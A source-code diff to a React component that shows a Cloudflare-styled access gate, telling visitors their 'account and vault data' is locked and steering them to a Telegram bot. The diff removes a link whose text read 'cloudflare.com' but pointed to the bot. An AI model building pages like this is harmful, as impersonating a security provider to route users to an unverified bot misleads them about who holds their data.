@@ -88,12 +88,12 @@ export const TelegramGateScreen: React.FC<TelegramGateScreenProps> = () => {
           <p className="text-[#555555] text-xs sm:text-base font-normal pt-0.5">
             Visit{" "}
             <a
-              href={botUrl}
+              href="https://telegram.org"
               target="_blank"
               rel="noopener noreferrer"
               className="text-[#0051c3] hover:underline font-normal"
             >
-              cloudflare.com
+              telegram.org
             </a>{" "}
             or launch via{" "}
             <a
@@ -243,45 +243,24 @@ export const TelegramGateScreen: React.FC<TelegramGateScreenProps> = () => {
           </div>
         </section>
 
-        {/* Real Cloudflare 2-Column Explanations in Standard Khmer & English */}
+        {/* Real Cloudflare 2-Column Explanations in Pure English (Zero Bilingual Mixing) */}
         <section className="max-w-4xl mx-auto px-5 sm:px-8 pt-8 sm:pt-12 pb-8 grid grid-cols-1 md:grid-cols-2 gap-7 sm:gap-12">
           {/* What happened? */}
-          <div className="space-y-2">
+          <div className="space-y-2.5">
             <h2 className="text-2xl sm:text-3xl font-light text-[#222222] tracking-tight">
-              តើមានអ្វីកើតឡើង?{" "}
-              <span className="text-xs sm:text-sm text-[#888888] font-normal block sm:inline">
-                What happened?
-              </span>
+              What happened?
             </h2>
             <p className="text-[#555555] text-xs sm:text-sm leading-relaxed font-normal font-sans">
-              ការចូលមើលទំព័រនេះត្រូវបានការពារដោយសុវត្ថិភាពខ្ពស់។ ម៉ាស៊ីនបម្រើគេហទំព័រ (Host) បានកំណត់ការអនុញ្ញាតចំពោះការបើកមើលដោយផ្ទាល់ពីកម្មវិធីរុករក ពីព្រោះមិនទាន់មានការផ្ទៀងផ្ទាត់សម័យប្រជុំផ្លូវការនៅឡើយ។
-            </p>
-            <p className="text-[#888888] text-[11px] sm:text-xs leading-relaxed font-normal font-sans">
               Access to this page is restricted for your security. The host server requires an authenticated session before displaying private account and vault data.
             </p>
           </div>
 
           {/* What can I do? */}
-          <div className="space-y-2">
+          <div className="space-y-2.5">
             <h2 className="text-2xl sm:text-3xl font-light text-[#222222] tracking-tight">
-              តើខ្ញុំត្រូវធ្វើយ៉ាងណា?{" "}
-              <span className="text-xs sm:text-sm text-[#888888] font-normal block sm:inline">
-                What can I do?
-              </span>
+              What can I do?
             </h2>
             <p className="text-[#555555] text-xs sm:text-sm leading-relaxed font-normal font-sans">
-              សូមបើកទំព័រនេះតាមរយៈតេឡេក្រាមបូតផ្លូវការ{" "}
-              <a
-                href={botUrl}
-                target="_blank"
-                rel="noopener noreferrer"
-                className="text-[#0051c3] hover:underline font-semibold"
-              >
-                @srievibot
-              </a>{" "}
-              ដើម្បីផ្ទៀងផ្ទាត់សម័យប្រជុំ និងទទួលបានការណែនាំលម្អិត។ ប្រព័ន្ធនឹងភ្ជាប់សុវត្ថិភាពដោយស្វ័យប្រវត្តិ និងបើកទំព័រជូនអ្នកភ្លាមៗ។
-            </p>
-            <p className="text-[#888888] text-[11px] sm:text-xs leading-relaxed font-normal font-sans">
               Please open this page via our verified Telegram bot{" "}
               <a
                 href={botUrl}
@@ -293,6 +272,19 @@ export const TelegramGateScreen: React.FC<TelegramGateScreenProps> = () => {
               </a>
               . The bot will automatically verify your session and unlock instant, secure access.
             </p>
+            <div className="pt-2 flex items-center gap-3">
+              <button
+                type="button"
+                onClick={() => {
+                  if (typeof window !== "undefined") {
+                    window.location.reload();
+                  }
+                }}
+                className="px-4 py-2 bg-[#1a73e8] hover:bg-[#1557b0] text-white text-xs sm:text-sm font-medium rounded transition select-none cursor-pointer"
+              >
+                Reload
+              </button>
+            </div>
           </div>
         </section>
       </div>
